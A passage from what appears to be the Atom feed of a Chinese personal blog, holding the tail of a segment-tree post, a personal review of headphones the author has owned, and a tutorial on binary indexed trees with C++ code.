number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">rangeSum</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>function<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> range <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">int</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> low <span class="token operator">&amp;&amp;</span> r <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">></span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">range</span><span class="token punctuation">(</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;与树状数组类似，线段树也是一种用来维护区间信息的数据结构，可以在对数时间复杂度内实现更新和查询等操作。但相较于树状数组多用于前缀和查询不同，线段树的应用范围更为广泛，例如区间最值等问题，代价是需要消耗更多的存储空间。&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://lordaeronesz.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="数据结构" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>自用耳机盘点</title>
    <link href="http://lordaeronesz.github.io/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/"/>
    <id>http://lordaeronesz.github.io/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/</id>
    <published>2024-03-12T01:03:08.000Z</published>
    <updated>2024-07-01T11:03:00.598Z</updated>
    
    <content type="html"><![CDATA[<p>最近几个月看了不少耳机相关的内容，初步了解了一些耳机的参数指标以及选购方案，同时也给自己使用的耳机进行了一波更新换代。本文就简单盘点一下自己之前用过的和现在正在使用的耳机，内容完全基于个人的使用体验。</p><span id="more"></span><h1 id="已退役"><a href="#已退役" class="headerlink" title="已退役"></a>已退役</h1><h2 id="赛睿-Arctis9x"><a href="#赛睿-Arctis9x" class="headerlink" title="赛睿 Arctis9x"></a>赛睿 Arctis9x</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/9x.jpg"></p><p>主要是为了无线连接 xbox 而购入。买之前看了不少网上的评价，包括视频评测以及 RTINGS 网站上的测试，感觉很不错，但是这耳机并没有国行版本，而且海外版售价高达 200 美元，对我而言实在是太贵，就在淘宝花 398 购入了一副所谓的“9成新”的“洋垃圾”。</p><p>单就产品本身的素质来说，我觉得还是很不错的。尽管作为游戏耳机，但它的音乐表现依然非常出色，三频的表现十分均衡。参考 RTINGS 网站上对于 9x 的评测，其中 Neutral Sound 项评分高达 7.8 分并给出了 “satisfactory” 的评价。麦克风质量也相当不错，这根可伸缩的麦克风虽小，但却拥有优秀的收音质量和降噪能力，不过我也只是拿到手的时候测试了一下，并没有怎么使用。佩戴方面，耳机头梁采用了松紧带的设计，使得佩戴时不至于压头。耳罩不算很透气，夏天佩戴可能会比较热，但好在相对柔软，网上普遍说赛睿 arctis  系列这套模具比较夹头，我感觉也稍微有点，但在可接受的范围之内。总之，作为游戏耳机，我对 9x 的表现还是相当满意的。</p><p>但由于是二手产品，电池不可避免的有一定程度的损耗，我这副看上去损耗还比较大，官方标称的 20 小时续航，我实际使用大概只能撑六七个小时。另外，使用了不到一年之后，连接耳机头梁和发声单元的转轴就出现了松动的情况，最开始也没怎么在意，但结果是越用越松，直到耳机已经无法稳固佩戴，晃动耳机还能听到断裂的塑料碎片的声音，应该是转轴内部物理结构的损坏。上网上一看，原来是比较普遍的现象，就挺无语的。尝试在淘宝找耳机维修，发现价格还挺贵的，想想还是算了，只能无奈将其退役了。</p><h2 id="Xbox-官方有线头戴"><a href="#Xbox-官方有线头戴" class="headerlink" title="Xbox 官方有线头戴"></a>Xbox 官方有线头戴</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/xbox.jpg"></p><p>9x 退役之后，就想着找一个接替它的游戏头戴，在使用 9x 的过程中，我发现无线对我而言好像并不是那么重要，而且无线耳机还得时刻关注电量，以及考虑长期使用后电池损耗的问题，因此我这次主要把目光放在了有线头戴上。</p><p>在雷蛇噬魂鲨有线和 Xbox 官方有线的纠结中，我最终还是选择了后者。现在想想，主要原因可能还是因为 Xbox 的外观设计更合我意以及期待官方配件的玄学加成（？？）。旋钮式音量调节、可弯曲收纳的麦克风以及 Xbox 标志性的绿色线材共同构成了这副耳机极简主义的设计。至少在外观部分，我还是比较喜欢的。</p><p>但耳机的实际使用体验不能说糟糕，却也很难让人满意。佩戴方面，耳罩是蛋白皮材质，触感还算 ok，也不夹头，但可能正因为不夹头，耳机的佩戴牢固性主要依靠压在头上的头梁来提供，佩戴时间稍长头部就会有很明显的不适感，因此佩戴方面的体验是很不理想的。音质表现也是完全没有达到要求，无论是风格还是素质都和之前使用的 9x 有比较明显的差距。调音风格上，9x 整体是偏向中高频的，听上去会比较亮，而 Xbox 有线则是偏向于中低频，声音非常的沉闷，刚拿到手听的时候就感觉非常不适应，与我的听音偏好很不匹配。素质上来说，9x 基本是完爆 Xbox 有线，毕竟二者其实本就不是一个价位段的产品，无论是解析力还是声场，前者相比后者都有非常明显的优势。之前我有对比过在游戏《荒野大镖客1》中同一个场景二者的声音表现，结果就是能够在 9x 中听到的一些非常微弱、具有方向感的环境声在 Xbox 有线中与游戏的场景音乐混作一团，丢失了大量细节。</p><p>最终，还是决定挂闲鱼出掉了。</p><h2 id="原道系列"><a href="#原道系列" class="headerlink" title="原道系列"></a>原道系列</h2><p>由于本人晚上睡觉时有收听电台的习惯，因此一副价格便宜、纯听个响的功能性耳机很有必要。因此号称听了触发“悔恨之泪”的原道就成为了我的首选。</p><p>原道系列这几年我也陆陆续续买了好多副了，包括最早散装的原道无迹，以及后来二次元封面的原道酱。最早的散装版本现在仍然在售，不过个人不太推荐，主要原因是线材质量不太行，我有好几副都是用了几个月之后出现了线材老化的情况，然后随之而来的就是耳机只有一边出声，不得不进行更换。后面出的原道酱在线材质量上有很大提升，我手里这条铜线版本用了一年多依然正常。不过作为我睡觉时佩戴的耳机，佩戴舒适度必然也要考虑其中，原道的这款平头塞采用了与经典的森海塞尔 mx500 相同的模具，声学结构设计上就很优秀，可能这也是原道在如此低的价位具备还不错的声音表现的重要原因，但是其在佩戴舒适度方面实在一般，耳机腔体不算小，长时间佩戴的情况下能感觉到由于塑料腔体与耳道硬接触而产生的硌痛感，戴上海绵套能相对缓解，但海绵套又很容易松动，时不时就会脱落，比较麻烦。</p><p>后来也有尝试过他家的 x39 微动圈，但是佩戴实在不牢固，稍微翻个身可能就掉了，另外入耳式也不适合长时间佩戴，容易出现中耳炎的症状，因此最终放弃。</p><h1 id="现役"><a href="#现役" class="headerlink" title="现役"></a>现役</h1><h2 id="飞利浦-SHP9500"><a href="#飞利浦-SHP9500" class="headerlink" title="飞利浦 SHP9500"></a>飞利浦 SHP9500</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/9500.jpg"></p><p>由于个人打游戏还是比较习惯头戴式耳机，因此在上述两幅头戴都退役之后就想着找一副音质出色、佩戴舒适的替代品。在各大论坛和评论区逛了一段时间，发现了一个反复被提到的名字：飞利浦 SHP9500，同时了解到这是一副开放式头戴，由于我之前并没有听过开放式头戴耳机的声音，对此比较好奇，加上价格也不算高，因此我也没有过多犹豫，就在闲鱼花 170 多淘了一副成色很不错的。</p><p>到手试听了一下，发现与此前听过的封闭式头戴的感受截然不同，声音非常通透干净，声场极其开阔，用通俗的语言来形容就是你能感受到各种乐器的声音分布在你耳朵的不同方位，临场感十足。这样开阔的声场也非常适合游玩大型 3A 游戏，能够很大程度上增加代入感。但是开放式也有很大的局限性，就是糟糕的隔音性能以及严重的漏音问题，这也意味着这类耳机的基本只能在比较私人的空间和场合使用，比较遗憾。</p><p>另一个令人印象深刻的点便是它的佩戴体验，个人使用过的头戴耳机不多，9500 绝对是其中佩戴最为舒适的无之一。耳机的可调节范围很大，加上透气且足够大的耳罩，使得大部分人都能通过简单调整获得一个比较舒适的佩戴感受，既不夹头也不压头，连续佩戴数个小时也不会感到疲劳。</p><p>最后要吐槽的一点就是原装线材虽然质感不错，但实在是太长了，足足有 3 米，我在使用了一段时间后还是嫌麻烦，自己买了一根飞利浦的 1.5 米编制线材，做工还算不错，与 9500 搭配也比较合适。</p><h2 id="水月雨-兰"><a href="#水月雨-兰" class="headerlink" title="水月雨 兰"></a>水月雨 兰</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/lan.jpg"></p><p>其实单论音质，9500 已经完全能够满足我的需求了，但是毕竟是开放式头戴，使用场景非常有限，就想着再入一副音质出色、方便携带、能够让我出门在外享受音乐的耳塞式耳机。作为我的候选产品的有 Nicehck DB2、兴戈 EW200、水月雨 竹2，以及我最终选择了的水月雨 兰，原因无外乎两点：平直中正的调音和优雅的外观。</p><p>首先是音质，购买前看网上评价说兰整体的调音取向是偏监听向的，低频不够有力，但个人平时听 ACG 音乐多一些，主要偏向于中高频，因此调音方面还算比较符合我的听音取向。拿到手后果然如此，并且解析力很强，不同乐器之间的分离度做得非常好，除了物理结构所限的声场外，整体听感已经很接近 9500 了，足以胜任个人的便携音乐耳机。</p><p>促使我选择兰的一个另外一个很重要的原因便是它的外观，当时在产品介绍页面第一眼看到便喜欢上了。不仅在于耳机腔体极简风格的设计，更在于原装线材与其共同搭配所表现出的一体性。线材的颜色本就与耳机本体风格很搭，还在分线处和插头部分使用了粉末冶金工艺，并配上兰标志性的 logo，进一步增强了耳机的质感，整体外观非常符合我的审美。</p><h2 id="苹果-Earpods"><a href="#苹果-Earpods" class="headerlink" title="苹果 Earpods"></a>苹果 Earpods</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/earpods.jpg"></p><p>个人现役的功能性耳机，也是我现在日常使用最多的耳机。</p><p>作为功能性耳机，佩戴舒适度必然是首先需要考虑的问题，earpods 在这方面可谓是相当优秀。轻盈的重量、贴耳的腔体以及光滑的材质共同造就了近乎无感的佩戴体验，以至于直到今天仍然有相当多的厂商模仿 earpods 的外观设计，可以说以一己之力开辟了半入耳式这个全新的赛道。</p><p>虽说个人主要把它当作功能性耳机来使用，但这并不意味着 earpods 的声音表现不行，相反，它的三频表现足够均衡，足以满足个人的大多数的影音需求。另外得益于开放式的设计，earpods 作为一副耳塞式耳机，拥有比其他封闭耳塞式耳机更加开阔的声场，整体的听感也更通透。</p><p>另外虽然个人使用的不多，但 earpods 这个不起眼的线控麦克风也值得一说。这个麦克风虽小，但却拥有相当不错的收音质量，参考 RTINGS 上的评分，earpods 的 Recording Quality 项高达 8.1 分，这个成绩已经达到了很多游戏耳机的水平，足以应付语音通话和线上会议的需求，缺点就是噪音抑制一般，需要在尽量安静的环境中使用。</p><p>官方 149 元的售价肯定称不上足够便宜以至于当消耗品来使用，但由于这款耳机已经发售多年，并且质量足够出色，以至于在二手市场上的保有量非常可观，基本上 50 ~ 60 元的价格就能淘到一副成色很不错的。因此只要能够接受二手，earpods 还是一个相当具有性价比的选择。</p><h2 id="红米-Airdots3pro"><a href="#红米-Airdots3pro" class="headerlink" title="红米 Airdots3pro"></a>红米 Airdots3pro</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/redmi.jpg"></p><p>红米的这副 TWS 还是 21 年的时候买的，但是个人使用的其实并不多。</p><p>耳机的质感还算比较出色，佩戴体验也很不错，比较牢固且舒适。声音表现放现在来看是比较糟糕的，整体的听感比较闷，即使切换到高音增强模式也没有太大改善，当然也可能与个人的听音喜好有关，总之对我而言，拿它来听音乐并不是一个好的选择。但毕竟是注重便携的 TWS，音质方面我也没有抱太高的期望，主要还是使用体验方面的问题。首先便是续航，我这副尽管使用并不频繁，但单次续航大概只有 3 ~ 4 个小时了，如果全程开启降噪或通透模式的话肯定会更低，加上充电仓后的总续航时间个人没有统计过，不过应该也不会太乐观。此外，不知道是什么原因，我总感觉在开启降噪模式后时不时会出现左右耳压不一致的情况，不知道是不是软件 bug，总之相当影响体验。最后就是耳机麦克风貌似只支持通话时调用，其他应用无法调用，因此诸如微信视频通话和录音等场合只能使用手机自带麦克风，原因不明。</p><p>虽说 airdots3pro 的使用体验放今天来看并不理想，但我目前并没有打算更换，毕竟我现在还是更习惯有线耳机即插即用、不用担心电量问题的省心感。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近几个月看了不少耳机相关的内容，初步了解了一些耳机的参数指标以及选购方案，同时也给自己使用的耳机进行了一波更新换代。本文就简单盘点一下自己之前用过的和现在正在使用的耳机，内容完全基于个人的使用体验。&lt;/p&gt;</summary>
    
    
    
    <category term="数码" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E7%A0%81/"/>
    
    
    <category term="闲谈" scheme="http://lordaeronesz.github.io/tags/%E9%97%B2%E8%B0%88/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="数码" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>动态前缀和数组：树状数组</title>
    <link href="http://lordaeronesz.github.io/2024/03/03/%E5%8A%A8%E6%80%81%E5%89%8D%E7%BC%80%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%9A%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    <id>http://lordaeronesz.github.io/2024/03/03/%E5%8A%A8%E6%80%81%E5%89%8D%E7%BC%80%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%9A%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/</id>
    <published>2024-03-03T01:03:08.000Z</published>
    <updated>2024-03-04T07:14:33.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前缀和的不足"><a href="#前缀和的不足" class="headerlink" title="前缀和的不足"></a>前缀和的不足</h1><p>前缀和是一种常见的算法思想，能够实现在常数时间复杂度下得到某个子区间内所有元素和。以一维数组 nums 为例，定义前缀和数组 preSum，<code>preSum[i]</code> 表示 nums 前 i 个元素的和，利用动态规划的思想，易得 <code>preSum[i] = preSum[i - 1] + nums[i]</code> 的递推关系，因此构造一个前缀和数组的时间复杂度为 O(n)，而查询前 i 个元素的和只需查询 <code>preSum[i]</code> 的值，为常数时间。</p><p>前缀和方法在数组元素不发生改变的情况下十分高效，但如果数组元素可能会发生改变，与朴素求和做法（不使用前缀和数组，而是直接遍历区间元素累计求和）相比，前缀和数组需要 O(n) 的时间来进行更新。这两种做法要么查询是 O(1)、更新是 O(n)，要么查询是 O(n)、更新是 O(1)，那有没有一种折衷的方案，使得查询和更新效率都不至于太低呢？本文将介绍的树状数组就符合这样的条件。</p><span id="more"></span><h1 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h1><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><p>由正整数的二进制表示可知，任何一个正整数都可以拆分为为若干个不重复的 2 的幂之和。那么对于一个下标从 1 开始且长度为 n 的数组，它的任意下标 i (1 &lt;= i &lt; n) 也可以依照此方案进行拆分，例如 7 = 4 + 2 + 1，那么对于一个区间 [1 ~ 7]，令被拆分得到的各整数为区间长度，按照从大到小的顺序，依次从左到右对区间进行分割，得到的各子区间为 [1 ~ 4]、[5 ~ 6] 和 [7 ~ 7]。这样分割具备一个非常好的性质：</p><p><em>对于分割后得到的任何子区间 [l, r]，r 必定唯一，且 r 的个数正好等于 n.</em></p><p>也就是说不存在两个子区间 [l1, r1]、[l2, r2] 满足：r1 = r2 且 l1 ≠ l2. 那么就可以以 r 为关键字（下标），构造一个数组 tree，<code>tree[r]</code> 表示区间 [l, r] （若 r 确定，则 l 也确定）的元素和。那么根据 7 = 4 + 2 + 1，有 <code>preSum[7] = tree[4] + tree[6] + tree[7]</code>。如下图所示，图中给出了对下标 1 ~ 16 进行拆分的结果。</p><p><img src="/2024/03/03/%E5%8A%A8%E6%80%81%E5%89%8D%E7%BC%80%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%9A%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/tree.png"></p><p>由于任何一个正整数 i 拆分后的整数数为其二进制表示中 1 的个数，令该个数为 ns，对于区间 [1, i]，其拆分得到区间个数也为 ns，即 <code>preSum[i]</code> 最多由 ns 个 tree 数组元素累加得到，因此前缀和的查询效率为 O(logn). </p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>上图中的连接线代表了 nums 数组元素（黄色方格）和 tree 数组元素（蓝色方格）以及不同 tree 数组元素之间的相互依赖关系，若 nums 数组元素发生改变，便需要根据上述依赖关系自底向上对 tree 数组元素进行更新，以保证查询的正确性，问题就在于如何用规范的数学语言表示图中所示的依赖关系。</p><p>既然区间的分割主要基于二进制的位级表示，那么元素更新的依赖关系也不妨从二进制的角度出发。首先观察下标 9 的更新路径：9 -&gt; 10 -&gt; 12 -&gt; 16，其二进制表示分别为：</p><pre class="language-none"><code class="language-none"> 9: 0100110: 0101012: 0110016: 10000</code></pre><p>似乎有 10 = 9 + 1，12 = 10 + 2，16 = 12 + 4 的关系存在。其中下标每次增加的值都为 2 的幂，且该 2 的幂即为当前下标 i 按上述规则拆分后得到的最小的数字。事实也的确如此（具备数学证明可以参考<a href="https://leetcode.cn/problems/range-sum-query-mutable/solutions/2524481/dai-ni-fa-ming-shu-zhuang-shu-zu-fu-shu-lyfll">带你发明树状数组！附数学证明</a>），这个最小数字通常称为一个数的 <strong>lowbit</strong>，即 <code>lowbit[9] = 1</code>、<code>lowbit[10] = 2</code>、<code>lowbit[12] = 4</code>。</p><p>得到这个规律后，更新操作便很容易了：若 <code>nums[i]</code> 改变，则首先更新 <code>tree[i]</code>，然后 <code>i += lowbit(i)</code>，继续更新 <code>tree[i]</code>，直到 i 超出了数组的范围，更新结束。注意到，<code>lowbit[i]</code> 在更新过程中是不断增大的，因此更新次数最多不超过 logn 次，即 tree 数组的更新效率为 O(logn).</p><h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><p>了解了如何根据 tree 数组计算前缀和以及如何更新 tree 数组后，接下来的问题就是如何初始化 tree 数组的值。一个简单的做法是先将 tree 数组各元素初始化为 0，再依次对每个 <code>nums[i]</code> 执行更新操作，这种方法的时间复杂度为 O(nlogn)。</p><p>注意 tree 数组的下标代表分割区间的右端点位置，如果当前更新到了下标 i 的位置，那么说明 <code>tree[i]</code> 的值已经初始化完毕（<code>nums[j](j &gt; i)</code> 与 <code>tree[i]</code> 无关），因此可直接将该值加入 <code>tree[i + lowbit(i)]</code> 中。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">binaryIndexedTree</span> <span class="token punctuation">&#123;</span><span class="token keyword">private</span><span class="token operator">:</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> tree<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token function">binaryIndexedTree</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">nums</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">tree</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> nums<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> next <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// i &amp; -i 即为 lowbit(i)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>next <span class="token operator">&lt;=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>next<span class="token punctuation">]</span> <span class="token operator">+=</span> tree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> dv <span class="token operator">=</span> val <span class="token operator">-</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tree<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> i <span class="token operator">&amp;</span> <span class="token operator">-</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> dv<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">preSum</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 区间 nums[0~idx) 的和</span><span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>idx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sum <span class="token operator">+=</span> tree<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>idx <span class="token operator">-=</span> <span class="token punctuation">(</span>idx <span class="token operator">&amp;</span> <span class="token operator">-</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前缀和的不足&quot;&gt;&lt;a href=&quot;#前缀和的不足&quot; class=&quot;headerlink&quot; title=&quot;前缀和的不足&quot;&gt;&lt;/a&gt;前缀和的不足&lt;/h1&gt;&lt;p&gt;前缀和是一种常见的算法思想，能够实现在常数时间复杂度下得到某个子区间内所有元素和。以一维数组 nums 为例，定义前缀和数组 preSum，&lt;code&gt;preSum[i]&lt;/code&gt; 表示 nums 前 i 个元素的和，利用动态规划的思想，易得 &lt;code&gt;preSum[i] = preSum[i - 1] + nums[i]&lt;/code&gt; 的递推关系，因此构造一个前缀和数组的时间复杂度为 O(n)，而查询前 i 个元素的和只需查询 &lt;code&gt;preSum[i]&lt;/code&gt; 的值，为常数时间。&lt;/p&gt;
